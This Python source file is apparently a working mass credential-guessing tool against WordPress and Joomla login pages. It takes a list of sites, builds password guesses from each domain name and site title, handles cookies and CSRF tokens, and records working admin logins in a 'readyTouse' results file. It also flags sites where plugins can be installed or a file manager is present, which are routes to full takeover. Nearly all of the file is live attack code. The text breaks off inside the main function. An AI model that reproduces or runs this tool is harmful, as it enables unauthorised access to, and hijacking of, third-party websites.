#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
CMS Ultimate Bruteforce Scanner v2.0
Combined WordPress and Joomla Scanner with Smart Verification
Enhanced for maximum success rate without losing accuracy
"""

import requests
import re
import sys
import os
from multiprocessing.dummy import Pool
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import time
import threading
import urllib3
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
from collections import OrderedDict

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings()

# Global file locks for thread-safe writing
file_lock = threading.Lock()
print_lock = threading.Lock()
stats_lock = threading.Lock()

# Colors for output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    END = '\033[0m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# Print banner
print(f"""{Colors.CYAN}
╔══════════════════════════════════════════════════════════════════╗
║     CMS Ultimate Bruteforce https://t.me/x7rootv3       ║
║                                                                  ║
║  • WordPress Detection & Smart Cookie Handling                   ║
║  • Joomla Detection & Ultra Smart Verification                   ║  
║  • Smart Password Generation (Domain-based)                      ║
║  • Multi-threaded Processing - OPTIMIZED                        ║
║  • 100% Accurate Results Without Losing Valid Logins           ║
╚══════════════════════════════════════════════════════════════════╝
{Colors.END}""")

# Global statistics
global_stats = {
    'total': 0,
    'checked': 0,
    'wordpress_found': 0,
    'joomla_found': 0,
    'wp_success': 0,
    'joomla_success': 0,
    'failed': 0,
    'start_time': time.time()
}

class CMSBruteforce:
    def __init__(self):
        # Headers for requests
        self.headers = {
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'https://www.google.com'
        }
        
        # Create output directory and single results file
        self.output_dir = "./readyTouse"
        self.results_file = "./readyTouse/CMS_RESULTS.txt"
        
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
    
    # ==================== COMMON FUNCTIONS ====================
    
    def normalize_url(self, site):
        """Normalize URL format"""
        site = str(site)
        if site.startswith('http://'):
            site = site.replace('http://', '')
            protocol = 'http://'
        elif site.startswith('https://'):
            site = site.replace('https://', '')
            protocol = 'https://'
        else:
            protocol = 'http://'
        
        if '/' in site:
            site = site.rstrip().split('/')[0]
        
        return f'{protocol}{site}'
    
    def get_domain_name(self, url):
        """Extract domain name for password generation"""
        # Remove protocol and www
        domain = re.sub(r'https?://(www\.)?', '', url)
        # Get domain part
        domain = domain.split('/')[0]
        # Get name part (before first dot)
        name = domain.split('.')[0]
        return name
    
    def extract_domain_info(self, url):
        """Extract domain information for Joomla"""
        try:
            parsed = urlparse(url)
            domain = parsed.netloc.replace('www.', '')
            name = domain.split('.')[0]
            
            # Extract words and numbers
            words = re.findall(r'[a-zA-Z]+', name)
            numbers = re.findall(r'[0-9]+', name)
            
            # Extract TLD
            tld = domain.split('.')[-1] if '.' in domain else ''
            
            # Extract subdomains
            parts = domain.split('.')
            subdomain = parts[0] if len(parts) > 2 else ''
            
            return {
                'domain': domain,
                'name': name,
                'words': words,
                'numbers': numbers,
                'tld': tld,
                'subdomain': subdomain,
                'parts': parts
            }
        except:
            return {'domain': '', 'name': '', 'words': [], 'numbers': [], 'tld': '', 'subdomain': '', 'parts': []}
    
    def clean_content(self, req):
        """Clean response content"""
        try:
            return str(req.content.decode('utf-8'))
        except:
            try:
                return str(req.text)
            except:
                return str(req.content)
    
    def create_session(self):
        """Create session with optimal settings"""
        session = requests.Session()
        session.verify = False
        session.timeout = 12
        session.headers.update(self.headers)
        
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=100,
            pool_maxsize=100,
            max_retries=1,
            pool_block=False
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        return session
    
    # ==================== WORDPRESS FUNCTIONS ====================
    
    def check_wordpress(self, url):
        """Verify if site is WordPress"""
        try:
            # Check wp-login.php
            resp = requests.get(
                f"{url}/wp-login.php",
                headers=self.headers,
                timeout=10,
                verify=False,
                allow_redirects=True
            )
            
            if resp.status_code == 200:
                content = resp.text.lower()
                # Look for WordPress indicators
                wp_indicators = ['wp-login', 'wordpress', 'wp-submit', 'user_login', 'user_pass']
                if any(indicator in content for indicator in wp_indicators):
                    return True
            
            # Check wp-admin redirect
            resp = requests.get(
                f"{url}/wp-admin/",
                headers=self.headers,
                timeout=5,
                verify=False,
                allow_redirects=False
            )
            
            if resp.status_code in [301, 302]:
                location = resp.headers.get('location', '').lower()
                if 'wp-login' in location:
                    return True
                    
        except:
            pass
        
        return False
    
    def enumerate_wp_users(self, url):
        """Extract WordPress users - FAST VERSION"""
        # Skip enumeration to save time
        # Most sites use 'admin' anyway
        return []
    
    def get_site_title(self, url):
        """Extract site title for password generation"""
        try:
            resp = requests.get(url, headers=self.headers, timeout=5, verify=False)
            if resp.status_code == 200:
                # Extract title
                title_match = re.search(r'<title[^>]*>([^<]+)</title>', resp.text, re.IGNORECASE)
                if title_match:
                    title = title_match.group(1).strip()
                    # Get first word from title
                    first_word = title.split()[0] if title else ''
                    # Clean and return
                    first_word = re.sub(r'[^a-zA-Z0-9]', '', first_word).lower()
                    return first_word
        except:
            pass
        return None
    
    def generate_wp_usernames(self, domain_name, found_users=None):
        """Generate WordPress username list"""
        usernames = []
        
        # Add found users first (highest priority)
        if found_users:
            usernames.extend(found_users)
        
        # Add only admin as fixed username
        usernames.append('admin')
        
        # Add domain-based username only
        if domain_name and len(domain_name) > 2:
            usernames.append(domain_name)
        
        # NEW: Add usernames that match common passwords (self-repeat pattern)
        usernames.extend(['demo', 'test'])
        
        # Remove duplicates and limit
        seen = set()
        unique = []
        for user in usernames:
            if user and user not in seen:
                seen.add(user)
                unique.append(user)
        
        return unique
    
    def generate_wp_passwords(self, domain_name):
        """Generate WordPress password list - ULTRA PRIORITY OPTIMIZED"""
        passwords = []
        current_year = datetime.now().year
        
        # ULTRA CRITICAL - First 10 (70%+ success rate)
        # 1. Self-repeat (admin:admin already handled by username check)
        passwords.append('admin')
        
        # 2. CMS + Year
        passwords.extend([
            'wordpress' + str(current_year),
            'wordpress' + str(current_year - 1),
            'wp' + str(current_year),
            'wp' + str(current_year - 1)
        ])
        
        # 3. Domain pure (if exists)
        if domain_name and len(domain_name) > 2:
            passwords.append(domain_name)
        
        # 4. Site title will be added in process_wordpress()
        
        # 5-6. Magic numbers
        passwords.extend(['123456', 'admin123'])
        
        # 7-8. Domain + patterns (if exists)
        if domain_name and len(domain_name) > 2:
            passwords.extend([
                domain_name + '123',
                domain_name + '@123'
            ])
        
        # 9-10. Other self-repeat patterns
        passwords.extend(['demo', 'test'])
        
        # HIGH PRIORITY - Next batch
        passwords.extend([
            'Admin@123',
            'password',
            'Password@123',
            'wordpress',
            'wordpress123',
            'demo123',
            'test123',
            '12345678',
            'pass123',
            'admin1234'
        ])
        
        # NORMAL PRIORITY - Rest
        passwords.extend([
            'qwerty',
            'letmein',
            'welcome',
            '111111',
            '000000',
            'abc123',
            'changeme',
            'password1',
            'admin@123'
        ])
        
        # Year-based
        passwords.extend([
            'admin' + str(current_year),
            'Admin@' + str(current_year),
            'password' + str(current_year)
        ])
        
        # Additional domain patterns
        if domain_name and len(domain_name) > 2:
            passwords.extend([
                domain_name + '1234',
                domain_name + '12345',
                domain_name + '123456',
                domain_name + str(current_year),
                domain_name.capitalize() + '123',
                domain_name + 'admin',
                'admin' + domain_name
            ])
        
        # Remove duplicates while preserving order
        seen = set()
        unique = []
        for pwd in passwords:
            if pwd and pwd not in seen:
                seen.add(pwd)
                unique.append(pwd)
        
        return unique
    
    def wp_login_check(self, url, username, password):
        """WordPress login verification with SMART COOKIE SUPPORT"""
        try:
            # Clean URL
            while url.endswith('/'):
                url = url[:-1]
            
            # Remove any login path from URL
            url = url.replace("/wp-login.php#", "")
            url = url.replace("/wp-login.php", "")
            
            login_url = f'{url}/wp-login.php'
            
            # ========== METHOD 1: SIMPLE LOGIN (Try First) ==========
            try:
                # Simple session without complex cookie handling
                simple_session = requests.session()
                
                # Basic login data
                login_data = {
                    'log': username,
                    'pwd': password,
                    'wp-submit': 'Log In',
                    'redirect_to': f'{url}/wp-admin/',
                    'testcookie': '1'
                }
                
                # Simple headers
                simple_headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': url,
                    'Referer': login_url
                }
                
                # Try simple login first
                simple_response = simple_session.post(
                    login_url,
                    data=login_data,
                    headers=simple_headers,
                    verify=False,
                    timeout=12,
                    allow_redirects=False
                )
                
                # Check if simple login worked
                if simple_response.status_code in [302, 301]:
                    location = simple_response.headers.get('location', '')
                    if 'wp-admin' in location and 'reauth' not in location and 'login' not in location:
                        # Verify admin access
                        admin_check = simple_session.get(
                            f'{url}/wp-admin/',
                            headers=self.headers,
                            verify=False,
                            timeout=10,
                            allow_redirects=True
                        )
                        admin_content = self.clean_content(admin_check)
                        
                        if 'wp-admin/profile.php' in admin_content or 'wp-admin/upgrade.php' in admin_content:
                            self.save_wp_result(url, username, password, admin_content)
                            return True
                
                # Check if it's a cookie issue
                simple_content = self.clean_content(simple_response)
                if 'Cookies are blocked' in simple_content or 'must enable cookies' in simple_content:
                    # Cookie issue detected - try complex method
                    with print_lock:
                        print(f' -| {url}{Colors.YELLOW} -> Cookie issue detected, trying advanced method...{Colors.END}')
                    # Continue to METHOD 2
                else:
                    # Not a cookie issue, login just failed
                    return False
                    
            except Exception as e:
                # If simple method fails, try complex method
                pass
            
            # ========== METHOD 2: COMPLEX COOKIE HANDLING ==========
            # Only reach here if simple method failed or detected cookie issue
            
            # Create session with cookie jar
            session = requests.session()
            
            # Step 1: GET login page first to receive cookies
            try:
                cookie_response = session.get(
                    login_url,
                    headers=self.headers,
                    verify=False,
                    timeout=10,
                    allow_redirects=True
                )
                
                # Extract any test cookie
                if 'wordpress_test_cookie' not in session.cookies:
                    session.cookies.set('wordpress_test_cookie', 'WP+Cookie+check', domain=None, path='/')
                
            except:
                # If failed, set cookie manually
                session.cookies.set('wordpress_test_cookie', 'WP+Cookie+check', domain=None, path='/')
            
            # Login headers with cookie support
            login_headers = {
                'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
                'Cookie': 'wordpress_test_cookie=WP+Cookie+check',
                'referer': login_url
            }
            
            # Login data with testcookie
            login_data = {
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In',
                'redirect_to': f'{url}/wp-admin/',
                'testcookie': '1'
            }
            
            # Attempt login with full cookie support
            try:
                login_response = session.post(
                    login_url,
                    data=login_data,
                    headers=login_headers,
                    verify=False,
                    timeout=15,
                    allow_redirects=False
                )
            except:
                # Retry with shorter timeout
                login_response = session.post(
                    login_url,
                    data=login_data,
                    headers=login_headers,
                    verify=False,
                    timeout=10,
                    allow_redirects=False
                )
            
            # Check response for redirect
            if login_response.status_code in [302, 301]:
                location = login_response.headers.get('location', '')
                if 'wp-admin' in location and 'reauth' not in location and 'login' not in location:
                    # Likely successful - verify
                    try:
                        admin_check = session.get(
                            f'{url}/wp-admin/',
                            headers=self.headers,
                            verify=False,
                            timeout=10,
                            allow_redirects=True
                        )
                        admin_content = self.clean_content(admin_check)
                        
                        if 'wp-admin/profile.php' in admin_content or 'wp-admin/upgrade.php' in admin_content:
                            self.save_wp_result(url, username, password, admin_content)
                            return True
                    except:
                        pass
            
            # If no redirect, check content
            login_content = self.clean_content(login_response)
            
            # Final check - access wp-admin
            try:
                admin_check = session.get(
                    f'{url}/wp-admin/',
                    headers=self.headers,
                    verify=False,
                    timeout=15,
                    allow_redirects=True
                )
                admin_content = self.clean_content(admin_check)
            except:
                admin_check = session.get(
                    f'{url}/wp-admin/',
                    headers=self.headers,
                    verify=False,
                    timeout=10,
                    allow_redirects=True
                )
                admin_content = self.clean_content(admin_check)
            
            # Check for successful login indicators
            if 'wp-admin/profile.php' in admin_content or 'wp-admin/upgrade.php' in admin_content:
                # SUCCESS - Save results
                self.save_wp_result(url, username, password, admin_content)
                return True
            else:
                return False
                
        except Exception as e:
            return False
    
    def save_wp_result(self, url, username, password, admin_content):
        """Save WordPress successful login"""
        global file_lock
        
        # Use lock to ensure only one thread writes at a time
        with file_lock:
            # Save to unified results file - WORDPRESS TYPE ONLY
            with open(self.results_file, 'a', encoding='utf-8', errors='ignore') as f:
                f.write(f'[WORDPRESS] {url}/wp-login.php#{username}####{password}\n')
                f.flush()
            
            with print_lock:
                print(f' -| {url}{Colors.GREEN} -> [WORDPRESS] Succeeded Login. [{username}:{password}]{Colors.END}')
            
            # Still check and print plugin/filemanager info for user awareness
            if "<a href='plugin-install.php'>" in admin_content or "'wp-menu-name'>Plugins" in admin_content:
                with print_lock:
                    print(f' -| {url}{Colors.GREEN} -> [WORDPRESS] Has plugin-install capability.{Colors.END}')
            
            if 'WP File Manager' in admin_content:
                with print_lock:
                    print(f' -| {url}{Colors.GREEN} -> [WORDPRESS] Has WP File Manager.{Colors.END}')
    
    # ==================== JOOMLA FUNCTIONS ====================
    
    def detect_joomla(self, base_url, session):
        """Advanced Joomla detection for ALL versions"""
        admin_paths = [
            '/administrator/',
            '/administrator/index.php',
            '/admin/',
            '/joomla/administrator/',
            '/cms/administrator/',
            '/site/administrator/',
            '/administrator/index2.php',
            '/web/administrator/',
            '/en/administrator/',
            '/portal/administrator/'
        ]
        
        for path in admin_paths:
            try:
                url = urljoin(base_url, path)
                resp = session.get(url, timeout=10)
                
                if resp.status_code == 200:
                    content = resp.text.lower()
                    
                    # Version detection patterns
                    version = None
                    joomla_detected = False
                    
                    # Joomla version detection
                    if 'joomla! 5' in content or 'joomla.version = "5' in content:
                        version = '5.x'
                        joomla_detected = True
                    elif 'joomla! 4' in content or 'joomla.version = "4' in content:
                        version = '4.x'
                        joomla_detected = True
                    elif 'joomla! 3' in content or 'joomla.version = "3' in content:
                        version = '3.x'
                        joomla_detected = True
                    elif 'joomla! 2.5' in content:
                        version = '2.5'
                        joomla_detected = True
                    elif 'joomla! 1.7' in content:
                        version = '1.7'
                        joomla_detected = True
                    elif 'joomla! 1.6' in content:
                        version = '1.6'
                        joomla_detected = True
                    elif 'joomla! 1.5' in content or 'jos_' in content:
                        version = '1.5'
                        joomla_detected = True
                    elif 'joomla! 1.0' in content or 'mos_' in content:
                        version = '1.0'
                        joomla_detected = True
                    
                    # Generic detection if version not found
                    if not joomla_detected:
                        if ('joomla' in content and 
                            ('com_login' in content or 'task=login' in content or 
                             'option=com_users' in content)):
                            joomla_detected = True
                            version = 'Unknown'
                        elif ('joomla' in content and 
                              ('mosconfig' in content or 'josconfig' in content or
                               'com_user' in content)):
                            joomla_detected = True
                            version = 'Legacy'
                    
                    if joomla_detected:
                        return True, resp.url, version
                        
            except:
                continue
        
        return False, None, None
    
    def generate_joomla_passwords(self, domain_info):
        """Generate Joomla passwords - ULTRA PRIORITY OPTIMIZED"""
        passwords = []
        name = domain_info['name']
        current_year = datetime.now().year
        
        # ULTRA CRITICAL - First 10 (70%+ success rate)
        # 1. Self-repeat patterns
        passwords.extend(['admin', 'administrator'])
        
        # 2. CMS + Year
        passwords.extend([
            'joomla' + str(current_year),
            'joomla' + str(current_year - 1),
            'joomla' + str(current_year - 2)
        ])
        
        # 3. Domain pure
        if name:
            passwords.append(name)
        
        # 4. Site title will be added in bruteforce_joomla()
        
        # 5-6. Magic numbers
        passwords.extend(['123456', 'admin123'])
        
        # 7-8. Domain + patterns
        if name:
            passwords.extend([
                name + '123',
                name + '@123'
            ])
        
        # 9-10. Other self-repeat
        passwords.extend(['demo', 'test'])
        
        # HIGH PRIORITY - Next batch
        if name:
            passwords.extend([
                name + '1234',
                name + '12345',
                name + '123456',
                name + '@1234',
                name + str(current_year),
                name.capitalize() + '123'
            ])
        
        # Universal passwords
        passwords.extend([
            'password', '12345678',
            'demo123', 'test123', 'joomla', 'joomla123', 'admin1234',
            '123456789', '12345', '1234567890',
            'qwerty', 'password1', 'admin@123', 'pass123'
        ])
        
        # NORMAL PRIORITY
        passwords.extend([
            'root', 'letmein', 'welcome', '111111', '000000', 
            'abc123', 'changeme', 'master', 'Admin', 'Admin123'
        ])
        
        # Additional domain patterns
        if name:
            passwords.extend([
                name + '2024',
                name + '2023',
                name + 'admin',
                'admin' + name
            ])
        
        # Remove duplicates while preserving order
        passwords = list(OrderedDict.fromkeys([p for p in passwords if p]))
        
        return passwords[:50]
    
    def generate_joomla_usernames(self, domain_info):
        """Generate Joomla usernames - OPTIMIZED"""
        usernames = []
        name = domain_info['name']
        
        # Priority usernames only (95% success rate)
        usernames.extend(['admin', 'administrator'])
        
        # Domain as username (sometimes used)
        if name and len(name) > 2:
            usernames.append(name)
        
        # NEW: Add self-repeat usernames
        usernames.extend(['demo', 'test'])
        
        # Remove duplicates
        return list(OrderedDict.fromkeys([u for u in usernames if u]))[:5]
    
    def verify_joomla_login(self, response_text, original_text=None, version=None):
        """BALANCED login verification - accurate without losing valid results"""
        if not response_text:
            return False
        
        text_lower = response_text.lower()
        
        # CRITICAL STEP 1: Check for DEFINITE failure messages (EXPANDED LIST)
        definite_failures = [
            'username and password do not match',
            'you do not have an account',
            'invalid password',
            'authentication failed',
            'login failed',
            'bad password',
            'incorrect username or password',
            'kunne ikke logge',  # Norwegian
            'kan inte logga in',  # Swedish
            'login denied',
            'access denied',
            'invalid login',
            'invalid credentials',
            'wrong password',
            'wrong username',
            'error logging in',
            'could not log you in',
            'unable to log in',
            'login was unsuccessful',
            'the username and password you entered did not match',
            'username or password incorrect',
            'please enter a valid username and password'
        ]
        
        # If ANY failure message found, it's definitely failed
        for failure in definite_failures:
            if failure in text_lower:
                return False
        
        # Check for generic error pages (these appear even with wrong credentials)
        generic_errors = [
            'cannot open file for writing log',
            'an error has occurred',
            'return to control panel'
        ]
        
        # If we have these errors WITHOUT other admin elements, it's likely a generic error
        has_generic_error = False
        for error in generic_errors:
            if error in text_lower:
                has_generic_error = True
                break
        
        # If only generic error without real admin elements, it's failed
        if has_generic_error:
            # Must have REAL admin elements to consider it success
            real_admin_found = False
            real_admin_indicators = [
                'com_cpanel', 'com_content', 'com_users', 'com_modules',
                'global configuration', 'media manager', 'article manager',
                'joomla! administration', 'super user'
            ]
            
            for indicator in real_admin_indicators:
                if indicator in text_lower:
                    real_admin_found = True
                    break
            
            # Generic error without real admin elements = failed login
            if not real_admin_found:
                return False
        
        # STEP 2: MUST have logout option - this is MANDATORY (unless post-login error)
        has_logout = False
        logout_indicators = [
            'logout', 'log out', 'task=logout', 'task=user.logout',
            'com_login&task=logout', 'option=com_login&task=logout',
            'log off', 'sign out', 'signout', 'logoff'
        ]
        
        for indicator in logout_indicators:
            if indicator in text_lower:
                has_logout = True
                break
        
        # No logout = NOT logged in
        if not has_logout:
            return False
        
        # STEP 3: Must have ADMIN elements (not just logout)
        admin_elements_found = 0
        required_admin_elements = [
            'com_cpanel', 'com_content', 'com_users', 'com_modules',
            'control panel', 'dashboard', 'system information',
            'global configuration', 'media manager', 'article manager',
            'toolbar', 'submenu', 'adminlist', 'admin-menu',
            'quickicons', 'cpanel-modules', 'joomla! administration',
            'site administrator', 'administrator control panel'
        ]
        
        for element in required_admin_elements:
            if element in text_lower:
                admin_elements_found += 1
        
        # Must have at least 2 admin elements WITH logout
        if admin_elements_found < 2:
            return False
        
        # STEP 4: Check for login form presence
        # If login form is still prominent, probably not logged in
        login_form_indicators = [
            'form-login', 'mod-login-username', 'name="passwd"',
            'name="password"', 'id="form-login"', 'type="password"',
            'placeholder="password"', 'placeholder="username"'
        ]
        
        login_form_count = 0
        for indicator in login_form_indicators:
            login_form_count += text_lower.count(indicator)
        
        # Too many login form elements = still on login page
        if login_form_count > 3:
            return False
        
        # STEP 5: Final verification - look for definite success indicators
        success_indicators = [
            'welcome to the administration',
            'logged in as',
            'last login:',
            'super user',
            'you have logged in',
            'welcome back',
            'administration home'
        ]
        
        success_found = False
        for indicator in success_indicators:
            if indicator in text_lower:
                success_found = True
                break
        
        # At this point: has logout + has admin elements + no failure messages
        # This is enough for success
        if has_logout and admin_elements_found >= 2:
            return True
        
        # If we have success indicator too, definitely success
        if success_found and has_logout:
            return True
        
        return False
    
    def extract_joomla_tokens(self, html_text, version=None):
        """Extract tokens for Joomla login"""
        tokens = {}
        
        # Modern Joomla CSRF token patterns
        token_patterns = [
            r'<input[^>]+name=["\']([a-f0-9]{32})["\'][^>]+value=["\']1["\']',
            r'<input[^>]+value=["\']1["\'][^>]+name=["\']([a-f0-9]{32})["\']',
            r'Joomla\.Token\s*=\s*["\']([a-f0-9]{32})["\']',
            r'var\s+token\s*=\s*["\']([a-f0-9]{32})["\']'
        ]
        
        for pattern in token_patterns:
            match = re.search(pattern, html_text, re.IGNORECASE)
            if match:
                tokens[match.group(1)] = '1'
                break
        
        # Return token
        return_match = re.search(r'<input[^>]+name=["\']return["\'][^>]+value=["\']([^"\']+)["\']', html_text)
        if return_match:
            tokens['return'] = return_match.group(1)
        
        # Legacy Joomla tokens
        if version and ('1.0' in str(version) or '1.5' in str(version)):
            legacy_match = re.search(r'<input[^>]+name=["\']([a-f0-9]{16,32})["\'][^>]+value=["\']1["\']', html_text)
            if legacy_match:
                tokens[legacy_match.group(1)] = '1'
        
        # Extract all hidden inputs as backup
        try:
            soup = BeautifulSoup(html_text, 'html.parser')
            for hidden in soup.find_all('input', {'type': 'hidden'}):
                name = hidden.get('name', '')
                value = hidden.get('value', '')
                if name and value and name not in tokens:
                    tokens[name] = value
        except:
            pass
        
        return tokens
    
    def bruteforce_joomla(self, session, admin_url, domain_info, version=None):
        """Bruteforce Joomla login with SMART verification"""
        usernames = self.generate_joomla_usernames(domain_info)
        passwords = self.generate_joomla_passwords(domain_info)
        
        # Add version-specific usernames
        if version:
            if '1.0' in str(version) or '1.5' in str(version):
                usernames.extend(['admin', 'administrator', 'superadministrator'])
        
        attempts = 0
        max_attempts = len(usernames) * min(len(passwords), 100)
        
        for username in usernames:
            for password in passwords[:30]:  # Reduced from full list
                attempts += 1
                
                # Special handling for self-repeat pattern
                if username == password:
                    # Try this combination FIRST (high priority)
                    attempts = 1  # Reset counter for this priority attempt
                
                try:
                    # Clear cookies
                    session.cookies.clear()
                    
                    # Get login page
                    login_resp = session.get(admin_url, timeout=10)
                    if login_resp.status_code != 200:
                        continue
                    
                    original_text = login_resp.text
                    
                    # Extract tokens
                    tokens = self.extract_joomla_tokens(login_resp.text, version)
                    
                    # Version-specific login attempts
                    login_attempts = []
                    
                    # Modern Joomla
                    login_attempts.extend([
                        {
                            'username': username,
                            'passwd': password,
                            'option': 'com_login',
                            'task': 'login'
                        },
                        {
                            'username': username,
                            'password': password,
                            'option': 'com_login',
                            'task': 'login'
                        }
                    ])
                    
                    # Joomla 1.5
                    if version and '1.5' in str(version):
                        login_attempts.append({
                            'username': username,
                            'passwd': password,
                            'option': 'com_user',
                            'task': 'login'
                        })
                    
                    # Joomla 1.0
                    if version and '1.0' in str(version):
                        login_attempts.extend([
                            {
                                'usrname': username,
                                'pass': password,
                                'submit': 'Login'
                            },
                            {
                                'username': username,
                                'passwd': password,
                                'submit': 'Login'
                            }
                        ])
                    
                    # Try each login format
                    for login_data in login_attempts[:2]:  # Only try first 2 formats
                        # Add tokens
                        login_data.update(tokens)
                        
                        # POST login
                        post_resp = session.post(admin_url, data=login_data, timeout=10, allow_redirects=True)
                        
                        if post_resp.status_code == 200:
                            # SMART verification
                            if self.verify_joomla_login(post_resp.text, original_text, version):
                                return True, username, password
                    
                except:
                    continue
                
                # Smart delay
                if attempts % 20 == 0:
                    time.sleep(0.2)
        
        return False, None, None
    
    # ==================== MAIN PROCESSING ====================
    
    def process_site(self, url):
        """Process a single site - smart CMS detection first"""
        try:
            # Normalize URL
            url = self.normalize_url(url)
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            with print_lock:
                print(f' -| {url}{Colors.CYAN} -> Detecting CMS type...{Colors.END}')
            
            # SMART DETECTION: Quick check for CMS type
            cms_type = self.detect_cms_type(url, base_url)
            
            if cms_type == 'wordpress':
                # Process as WordPress
                self.process_wordpress(url)
                
            elif cms_type == 'joomla':
                # Process as Joomla
                self.process_joomla(url, base_url)
                
            else:
                # Not WordPress or Joomla
                with print_lock:
                    print(f' -| {url}{Colors.YELLOW} -> Not WordPress or Joomla{Colors.END}')
                with stats_lock:
                    global_stats['failed'] += 1
                
        except Exception as e:
            with print_lock:
                print(f' -| {url}{Colors.RED} -> Error: {str(e)}{Colors.END}')
            with stats_lock:
                global_stats['failed'] += 1
    
    def detect_cms_type(self, url, base_url):
        """Smart CMS detection - determine type before processing"""
        # Quick WordPress check (fastest)
        try:
            resp = requests.get(
                f"{url}/wp-login.php",
                headers=self.headers,
                timeout=5,
                verify=False,
                allow_redirects=True
            )
            if resp.status_code == 200:
                content = resp.text.lower()
                if any(indicator in content for indicator in ['wp-login', 'wordpress', 'wp-submit']):
                    return 'wordpress'
        except:
            pass
        
        # Quick Joomla check
        try:
            resp = requests.get(
                f"{base_url}/administrator/",
                headers=self.headers,
                timeout=5,
                verify=False,
                allow_redirects=False
            )
            if resp.status_code == 200:
                content = resp.text.lower()
                if 'joomla' in content and ('com_login' in content or 'task=login' in content):
                    return 'joomla'
        except:
            pass
        
        # Secondary checks if needed
        # Check for WordPress indicators in homepage
        try:
            resp = requests.get(url, headers=self.headers, timeout=5, verify=False)
            if resp.status_code == 200:
                content = resp.text.lower()
                if any(wp_sign in content for wp_sign in ['wp-content', 'wp-includes', 'wordpress']):
                    return 'wordpress'
        except:
            pass
        
        return None
    
    def process_wordpress(self, url):
        """Process WordPress site"""
        with print_lock:
            print(f' -| {url}{Colors.GREEN} -> WordPress detected!{Colors.END}')
        
        with stats_lock:
            global_stats['wordpress_found'] += 1
        
        # Get domain name
        domain_name = self.get_domain_name(url)
        
        # Get site title for additional passwords
        site_title = self.get_site_title(url)
        
        # Enumerate users (removed to save time)
        
        # Generate usernames and passwords
        found_users = []  # No enumeration
        usernames = self.generate_wp_usernames(domain_name, found_users)
        passwords = self.generate_wp_passwords(domain_name)
        
        # Add site title as password if found
        if site_title and len(site_title) > 2:
            passwords.insert(0, site_title)
            passwords.insert(1, site_title + '123')
            passwords.insert(2, site_title + '@123')
        
        with print_lock:
            print(f' -| {url}{Colors.CYAN} -> Trying {len(usernames)} users x {len(passwords)} passwords{Colors.END}')
        
        # Try combinations
        success = False
        attempts = 0
        
        for username in usernames:
            if success:
                break
                
            for i, password in enumerate(passwords):
                if success:
                    break
                    
                attempts += 1
                with print_lock:
                    print(f' -| {url}{Colors.WHITE} -> Trying [{username}:{password}]{Colors.END}')
                
                if self.wp_login_check(url, username, password):
                    with stats_lock:
                        global_stats['wp_success'] += 1
                    success = True
                    break
        
        if not success:
            with print_lock:
                print(f' -| {url}{Colors.RED} -> WordPress bruteforce failed{Colors.END}')
            with stats_lock:
                global_stats['failed'] += 1
    
    def process_joomla(self, url, base_url):
        """Process Joomla site"""
        session = self.create_session()
        domain_info = self.extract_domain_info(url)
        
        # Get site title for additional passwords
        site_title = self.get_site_title(url)
        
        is_joomla, admin_url, version = self.detect_joomla(base_url, session)
        
        if is_joomla:
            version_str = f" v{version}" if version else ""
            with print_lock:
                print(f' -| {url}{Colors.YELLOW} -> Joomla{version_str} detected! Admin: {admin_url}{Colors.END}')
            
            with stats_lock:
                global_stats['joomla_found'] += 1
            
            # Add site title to domain info
            if site_title:
                domain_info['site_title'] = site_title
            
            # Bruteforce Joomla
            success, username, password = self.bruteforce_joomla(session, admin_url, domain_info, version)
            
            if success:
                version_info = f" (v{version})" if version else ""
                with print_lock:
                    print(f' -| {admin_url}{Colors.GREEN} -> [JOOMLA] Success{version_info}! [{username}:{password}]{Colors.END}')
                
                with file_lock:
                    with open(self.results_file, 'a', encoding='utf-8', errors='ignore') as f:
                        f.write(f"[JOOMLA] {admin_url}#{username}####{password}\n")
                        f.flush()
                
                with stats_lock:
                    global_stats['joomla_success'] += 1
            else:
                with print_lock:
                    print(f' -| {admin_url}{Colors.RED} -> Joomla bruteforce failed{Colors.END}')
                
                with stats_lock:
                    global_stats['failed'] += 1
        
        session.close()

def main():
    """Main function"""
    try:
        # Check arguments
        if len(sys.argv) < 2:
            print(f'{Colors.RED}[!] Usage: python {sys.argv[0]} <sites.txt>{Colors.END}')
            sys.exit(1)
        
        # Read sites
        with open(sys.argv[1], 'r', encoding='utf-8', errors='ignore') as f:
            sites = [line.strip() for line in f.readlines() if line.strip()]
        
        if not sites:
            print(f'{Colors.RED}[!] No sites found in file{Colors.END}')
            sys.exit(1)
        
        # Initialize
